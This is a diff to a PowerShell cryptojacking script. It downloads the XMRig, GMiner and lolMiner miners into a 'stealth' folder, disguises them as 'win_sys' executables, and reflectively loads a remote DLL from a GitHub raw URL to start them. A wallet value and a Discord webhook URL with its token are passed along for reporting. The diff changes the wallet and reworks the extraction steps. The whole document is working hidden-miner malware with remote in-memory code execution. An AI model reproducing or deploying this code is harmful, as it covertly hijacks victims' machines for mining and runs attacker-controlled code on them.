@@ -5,7 +5,7 @@ $DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.d
 $MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
 $GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
 $AmdMinerUrl = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.88/lolMiner_v1.88_Win64.zip"
-$Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
+$Wallet = "1871092382" # Mining Key
 $Webhook = "https://discord.com/api/webhooks/1496175376966090855/I_Dn3uZ1clrG-J3XR-T0LRnUo6HKP6u8Ww2j7iut7mcKIZHSyWBzOEwZODtGR3zdAQlK"
 
 # --- STEALTH SETUP ---
@@ -21,15 +21,18 @@ $CpuExe = Join-Path $StealthDir "win_sys_x.exe"
 $GpuExe = Join-Path $StealthDir "win_sys_g.exe"
 
 $wc = New-Object System.Net.WebClient
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# 1. Handle CPU Miner
+# 1. Handle CPU Miner (RUTHLESS SEARCH)
 if (-not (Test-Path $CpuExe)) {
     try {
         $wc.DownloadFile($MinerUrl, $CpuZip)
-        Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force -ErrorAction SilentlyContinue
-        Remove-Item $CpuZip -Force -ErrorAction SilentlyContinue
-        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
+        $TempDir = Join-Path $StealthDir "temp_c"
+        Expand-Archive -Path $CpuZip -DestinationPath $TempDir -Force
+        $Unzipped = Get-ChildItem -Path $TempDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
         if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $CpuExe -Force }
+        Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item $CpuZip -Force -ErrorAction SilentlyContinue
     } catch { }
 }
 
@@ -48,30 +51,27 @@ if (($NvidiaGpu -or $AmdGpu) -and -not (Test-Path $GpuExe)) {
     try {
         $TargetUrl = if ($NvidiaGpu) { $GpuMinerUrl } else { $AmdMinerUrl }
         $wc.DownloadFile($TargetUrl, $GpuZip)
-        Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force -ErrorAction SilentlyContinue
-        Remove-Item $GpuZip -Force -ErrorAction SilentlyContinue
+        $TempDir = Join-Path $StealthDir "temp_g"
+        Expand-Archive -Path $GpuZip -DestinationPath $TempDir -Force
         $Filter = if ($NvidiaGpu) { "miner.exe" } else { "lolMiner.exe" }
-        $Unzipped = Get-ChildItem -Path $StealthDir -Filter $Filter -Recurse | Select-Object -First 1
+        $Unzipped = Get-ChildItem -Path $TempDir -Filter $Filter -Recurse | Select-Object -First 1
         if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $GpuExe -Force }
+        Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item $GpuZip -Force -ErrorAction SilentlyContinue
     } catch { }
 }
 
 # --- REFLECTIVE LOADING ---
 try {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     $dllBytes = $wc.DownloadData($DllUrl)
     $assembly = [System.Reflection.Assembly]::Load($dllBytes)
     $loader = $assembly.GetTypes() | Where-Object { $_.Name -eq "DateFundLoader" } | Select-Object -First 1
-    # Explicitly find the method with a single string parameter to avoid ambiguity
     $startMethod = $loader.GetMethod("StartMiner", [Type[]]@([string]))
     
     $GpuArg = if ($NvidiaGpu -or $AmdGpu) { $GpuExe } else { "" }
     $IsAmd = if ($AmdGpu) { "true" } else { "false" }
     
-    # Pack parameters into a single string
     $combinedArgs = "$CpuExe|$GpuArg|$Wallet|$IsAmd|$Webhook"
-    
-    # Create a pure .NET object array for the Invoke call
     $invokeArgs = New-Object System.Object[] 1
     $invokeArgs[0] = [string]$combinedArgs
     
